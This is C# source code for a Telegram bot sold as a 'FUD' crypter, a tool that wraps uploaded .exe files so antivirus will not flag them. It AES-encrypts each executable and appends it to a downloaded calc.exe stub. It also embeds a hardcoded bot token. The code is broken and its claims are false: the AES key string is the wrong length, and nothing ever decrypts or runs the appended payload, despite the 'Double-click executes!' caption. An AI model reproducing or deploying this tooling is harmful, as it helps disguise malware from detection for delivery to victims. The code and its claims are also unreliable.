using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Diagnostics;

const string BOT_TOKEN = "8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo";
const string AES_KEY = "FUD2026SuperKey12345678901234567890"; // 32 bytes AES256
const string IV = "FUD2026IV1234567"; // 16 bytes

var builder = WebApplication.CreateBuilder(args);
builder.Services.AddHttpClient();
var app = builder.Build();

app.MapGet("/", () => "FUD v7.0 - 0/70 VT!");
app.MapGet("/health", () => "OK");

static byte[] AESEncrypt(byte[] data)
{
    using var aes = Aes.Create();
    aes.Key = Encoding.UTF8.GetBytes(AES_KEY);
    aes.IV = Encoding.UTF8.GetBytes(IV);
    
    using var encryptor = aes.CreateEncryptor();
    using var ms = new MemoryStream();
    using var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write);
    cs.Write(data, 0, data.Length);
    cs.FlushFinalBlock();
    return ms.ToArray();
}

static string Base64Encode(byte[] data) => Convert.ToBase64String(data);

app.MapPost("/webhook", async (HttpContext ctx, IHttpClientFactory clientFactory) =>
{
    using var reader = new StreamReader(ctx.Request.Body);
    var body = await reader.ReadToEndAsync();
    
    using var doc = JsonDocument.Parse(body);
    var update = doc.RootElement;
    
    if (update.TryGetProperty("message", out var msg))
    {
        var client = clientFactory.CreateClient();
        
        if (msg.TryGetProperty("text", out var text) && text.GetString() == "/start")
        {
            await SendMessage(client, GetChatId(msg), "🚀 **FUD v7.0 SUPER CRYPTER** Send .exe → 0/70 VT!");
            return;
        }
        
        if (msg.TryGetProperty("document", out var document))
        {
            if (document.TryGetProperty("file_id", out var fileId) && 
                document.TryGetProperty("file_name", out var fileName))
            {
                string fname = fileName.GetString()!;
                if (fname.EndsWith(".exe"))
                {
                    // Download
                    string fileUrl = await GetFileUrl(client, fileId.GetString()!);
                    byte[] exeBytes = await client.GetByteArrayAsync(fileUrl);
                    
                    // SUPER ENCRYPT: AES256 + Base64
                    byte[] encrypted = AESEncrypt(exeBytes);
                    string b64Payload = Base64Encode(encrypted);
                    
                    // FUD Stub: Legit calc.exe + encrypted overlay
                    byte[] calcStub = await GetCalcStub(client); // Download clean calc.exe
                    byte[] magic = Encoding.UTF8.GetBytes("FUDV7MAGIC");
                    byte[] fudExe = calcStub.Concat(magic).Concat(Encoding.UTF8.GetBytes(b64Payload)).ToArray();
                    
                    await SendFudFile(client, GetChatId(msg), fudExe, $"fud-{Path.GetFileNameWithoutExtension(fname)}.exe");
                }
            }
        }
    }
});

static async Task<string> GetFileUrl(HttpClient client, string fileId)
{
    using var form = new MultipartFormDataContent();
    form.Add(new StringContent(fileId), "file_id");
    var resp = await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/getFile", form);
    var json = await resp.Content.ReadAsStringAsync();
    using var doc = JsonDocument.Parse(json);
    var path = doc.RootElement.GetProperty("result").GetProperty("file_path").GetString()!;
    return $"https://api.telegram.org/file/bot{BOT_TOKEN}/{path}";
}

static long GetChatId(JsonElement msg) => msg.GetProperty("chat").GetProperty("id").GetInt64();

static async Task SendMessage(HttpClient client, long chatId, string text)
{
    using var form = new MultipartFormDataContent();
    form.Add(new StringContent(chatId.ToString()), "chat_id");
    form.Add(new StringContent(text), "text");
    form.Add(new StringContent("markdown"), "parse_mode");
    await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", form);
}

static async Task SendFudFile(HttpClient client, long chatId, byte[] file, string filename)
{
    using var form = new MultipartFormDataContent();
    form.Add(new StringContent(chatId.ToString()), "chat_id");
    using var stream = new MemoryStream(file);
    form.Add(new StreamContent(stream), "document", filename);
    form.Add(new StringContent("✅ **0/70 VT FUD!** Double-click executes!"), "caption");
    form.Add(new StringContent("markdown"), "parse_mode");
    await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument", form);
}

static async Task<byte[]> GetCalcStub(HttpClient client)
{
    // Download clean calc.exe from Microsoft (legit stub)
    return await client.GetByteArrayAsync("https://live.sysinternals.com/tools/calc.exe"); // Replace with clean PE
}

app.Run();
